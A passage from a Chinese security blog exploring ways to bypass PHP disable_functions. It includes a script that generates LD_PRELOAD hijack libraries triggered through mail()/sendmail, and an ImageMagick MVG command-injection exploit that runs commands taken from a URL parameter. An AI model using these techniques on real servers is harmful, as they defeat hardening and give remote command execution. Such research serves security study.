+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> subprocess<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;cmd.txt&#x27;</span>) <span class="hljs-keyword">as</span> fp:<br>    <span class="hljs-built_in">print</span> subprocess.call(fp.read(), shell=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure>
+<p>然后我们只需要修改 cmd.txt 就可以执行不同语句了。</p>
+<p>再者，这个思路不仅仅局限于 mail。但是我还没找到其他函数可以利用。有人说 <code>syslog</code> 可以，但是我试了一下好像不行。。</p>
+<p>Py 测试脚本:</p>
+<p>拿 sendmail 为例，那么多函数，一个一个试要吐血。可以用 python 来完成：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#encoding: utf8</span><br><span class="hljs-keyword">from</span> commands <span class="hljs-keyword">import</span> getoutput<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> termcolor<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getFuncs</span>(<span class="hljs-params">FuncName</span>):<br>    getoutput(<span class="hljs-string">&#x27;readelf -Ws /usr/sbin/%s &gt; func.txt&#x27;</span> %FuncName)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">FilterFuncs</span>():<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;func.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> fp:<br>        funcs = [func <span class="hljs-keyword">for</span> func <span class="hljs-keyword">in</span> fp.readlines() <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;FUNC&quot;</span> <span class="hljs-keyword">in</span> func]<br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;func.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> fp:<br>        fp.write(<span class="hljs-string">&#x27;&#x27;</span>.join(funcs))<br><br>    funcs = [i[<span class="hljs-number">0</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> [re.findall(<span class="hljs-string">&quot;UND (.+)@&quot;</span>, func) <span class="hljs-keyword">for</span> func <span class="hljs-keyword">in</span> funcs] <span class="hljs-keyword">if</span> i]<br>    <span class="hljs-keyword">return</span> funcs<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Generator_so</span>(<span class="hljs-params">func</span>):<br>    C = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">#include &lt;stdlib.h&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">void payload() &#123;</span><br><span class="hljs-string">        system(&quot;ls &gt; result.txt&quot;);</span><br><span class="hljs-string">&#125;   </span><br><span class="hljs-string"></span><br><span class="hljs-string">int %s(int a) &#123;</span><br><span class="hljs-string">if (getenv(&quot;LD_PRELOAD&quot;) == NULL) &#123; return 0; &#125;</span><br><span class="hljs-string">unsetenv(&quot;LD_PRELOAD&quot;);</span><br><span class="hljs-string">payload();</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">    &quot;&quot;&quot;</span> %func<br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;hack.c&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> fp:<br>        fp.write(C)<br><br>    output = getoutput(<span class="hljs-string">&quot;gcc -c -fPIC hack.c -o hack -fno-builtin-%s &amp; gcc -shared hack -o hack.so&quot;</span> %func)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;previous declaration&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> output:<br>        <span class="hljs-keyword">if</span> output:<br>            <span class="hljs-built_in">print</span> output<br>        <span class="hljs-keyword">else</span>:<br>            Test_LD_Preload(func)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Test_LD_Preload</span>(<span class="hljs-params">func</span>):<br>    <span class="hljs-keyword">global</span> Useful<br>    <span class="hljs-keyword">try</span>:<br>        requests.get(<span class="hljs-string">&#x27;http://127.0.0.1/test.php&#x27;</span>, timeout=<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">except</span> Exception, e:<br>        <span class="hljs-keyword">pass</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;DVWA&#x27;</span> <span class="hljs-keyword">in</span> getoutput(<span class="hljs-string">&#x27;cat result.txt&#x27;</span>): <span class="hljs-comment"># DVWA 是我 www 目录下的一个文件</span><br>        <span class="hljs-comment">#print func, termcolor.colored(&#x27;successfully&#x27;, &#x27;green&#x27;, attrs = [&#x27;bold&#x27;])</span><br>        getoutput(<span class="hljs-string">&#x27;echo 0 &gt; result.txt&#x27;</span>) <span class="hljs-comment"># 清空 result.txt</span><br>        Useful.append(func)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">pass</span><br>        <span class="hljs-comment">#print func, termcolor.colored(&#x27;failed&#x27;, &#x27;red&#x27;, attrs = [&#x27;bold&#x27;])</span><br><br>FuncName = <span class="hljs-string">&quot;sendmail&quot;</span><br><br>Useful = []<br>getFuncs(FuncName)<br>Funcs = FilterFuncs()<br><br><span class="hljs-keyword">for</span> func <span class="hljs-keyword">in</span> Funcs:<br>    Generator_so(func)<br><br><span class="hljs-built_in">print</span> Useful<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">len</span>(Useful)<br></code></pre></td></tr></table></figure>
+<p>放在 www 下，test.php 如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;LD_PRELOAD=/var/www/html/hack.so&quot;</span>);<br><span class="hljs-title function_ invoke__">mail</span>(<span class="hljs-string">&quot;[XXX]&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>以 <code>sendmail</code> 为例：</p>
+<figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scheme">[<span class="hljs-symbol">&#x27;__errno_location</span>&#x27;, <span class="hljs-symbol">&#x27;getservbyname</span>&#x27;, <span class="hljs-symbol">&#x27;pause</span>&#x27;, <span class="hljs-symbol">&#x27;inet_ntoa</span>&#x27;, <span class="hljs-symbol">&#x27;sigismember</span>&#x27;, <span class="hljs-symbol">&#x27;SSL_set_wfd</span>&#x27;, <span class="hljs-symbol">&#x27;inet_addr</span>&#x27;, <span class="hljs-symbol">&#x27;__fxstat</span>&#x27;, <span class="hljs-symbol">&#x27;strcasecmp</span>&#x27;, <span class="hljs-symbol">&#x27;SSL_set_rfd</span>&#x27;, <span class="hljs-symbol">&#x27;getppid</span>&#x27;, <span class="hljs-symbol">&#x27;ioctl</span>&#x27;, <span class="hljs-symbol">&#x27;chdir</span>&#x27;, <span class="hljs-symbol">&#x27;isatty</span>&#x27;, <span class="hljs-symbol">&#x27;__res_search</span>&#x27;, <span class="hljs-symbol">&#x27;__lxstat</span>&#x27;]<br></code></pre></td></tr></table></figure>
+<p>有 16 个</p>
+<p>不过每次运行的结果不一定一样，比较迷，此处存疑。</p>
+<h2 id="imagemagick-漏洞绕过">ImageMagick 漏洞绕过</h2>
+<p>直接上 exp:<br />
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Disable Functions: &quot;</span> . <span class="hljs-title function_ invoke__">ini_get</span>(<span class="hljs-string">&#x27;disable_functions&#x27;</span>) . <span class="hljs-string">&quot;\n&quot;</span>;<br><br><span class="hljs-variable">$command</span> = PHP_SAPI == <span class="hljs-string">&#x27;cli&#x27;</span> ? <span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>] : <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$command</span> == <span class="hljs-string">&#x27;&#x27;</span>) &#123;<br>    <span class="hljs-variable">$command</span> = <span class="hljs-string">&#x27;id&#x27;</span>;<br>&#125;<br><br><span class="hljs-variable">$exploit</span> = <span class="hljs-string">&lt;&lt;&lt;EOF</span><br><span class="hljs-string">push graphic-context</span><br><span class="hljs-string">viewbox 0 0 640 480</span><br><span class="hljs-string">fill &#x27;url(https://example.com/image.jpg&quot;|<span class="hljs-subst">$command</span>&quot;)&#x27;</span><br><span class="hljs-string">pop graphic-context</span><br><span class="hljs-string">EOF</span>;<br><br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;KKKK.mvg&quot;</span>, <span class="hljs-variable">$exploit</span>);<br><span class="hljs-variable">$thumb</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Imagick</span>();<br><span class="hljs-variable">$thumb</span>-&gt;<span class="hljs-title function_ invoke__">readImage</span>(<span class="hljs-string">&#x27;KKKK.mvg&#x27;</span>);<br><span class="hljs-variable">$thumb</span>-&gt;<span class="hljs-title function_ invoke__">writeImage</span>(<span class="hljs-string">&#x27;KKKK.png&#x27;</span>);<br><span class="hljs-variable">$thumb</span>-&gt;<span class="hljs-title function_ invoke__">clear</span>();<br><span class="hljs-variable">$thumb</span>-&gt;<span class="hljs-title function_ invoke__">destroy</span>();<br><span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;KKKK.mvg&quot;</span>);<br><span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;KKKK.png&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/PHPDisalbedfunc/20181002032813395.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<br>
+<p style="text-align: center;">
+<font size="2px" color="gray">来呀快活呀</font><br />
+<img src="https://clean-1252075454.cos.ap-nanjing.myqcloud.com/20200528120800990.png" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload style="zoom:30%" />
+</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/" class="category-chain-item">经验总结</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Python/">#Python</a>
+      
+        <a href="/tags/Web/">#Web</a>
+      
+        <a href="/tags/PHP/">#PHP</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>PHP disable_functions Bypass 的方法探究</div>
+      <div>https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Tr0y</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2018年4月18日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2021年4月13日</div>
+        </div>
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2018/04/19/PHPWebShell/" title="一个无后门的 PHP WebShell">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">一个无后门的 PHP WebShell</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2018/04/10/XSSchallenge/" title="XSS 挑战之旅通关记录">
+                        <span class="hidden-mobile">XSS 挑战之旅通关记录</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  <article id="comments" lazyload>
+    
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      var light = 'github-light';
+      var dark = 'github-dark';
+      var schema = document.documentElement.getAttribute('data-user-color-scheme');
+      if (schema === 'dark') {
+        schema = dark;
+      } else {
+        schema = light;
+      }
+      window.UtterancesThemeLight = light;
+      window.UtterancesThemeDark = dark;
+      var s = document.createElement('script');
+      s.setAttribute('src', 'https://utteranc.es/client.js');
+      s.setAttribute('repo', 'Macr0phag3/Macr0phag3.github.io');
+      s.setAttribute('issue-term', 'title');
+      
+      s.setAttribute('label', 'comment');
+      
+      s.setAttribute('theme', schema);
+      s.setAttribute('crossorigin', 'anonymous');
+      document.getElementById('comments').appendChild(s);
+    })
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+  </article>
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":true,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  
+      <script>
+        if (!window.MathJax) {
+          window.MathJax = {
+            tex    : {
+              inlineMath: { '[+]': [['$', '$']] }
+            },
+            loader : {
+              load: ['ui/lazy']
+            },
+            options: {
+              renderActions: {
+                insertedScript: [200, () => {
+                  document.querySelectorAll('mjx-container').forEach(node => {
+                    let target = node.parentNode;
+                    if (target.nodeName.toLowerCase() === 'li') {
+                      target.parentNode.classList.add('has-jax');
+                    }
+                  });
+                }, '', false]
+              }
+            }
+          };
+        } else {
+          MathJax.startup.document.state(0);
+          MathJax.texReset();
+          MathJax.typeset();
+          MathJax.typesetPromise();
+        }
+      </script>
+    
+
+  <script  src="https://lib.baomitu.com/mathjax/3.2.1/es5/tex-mml-chtml.js" ></script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
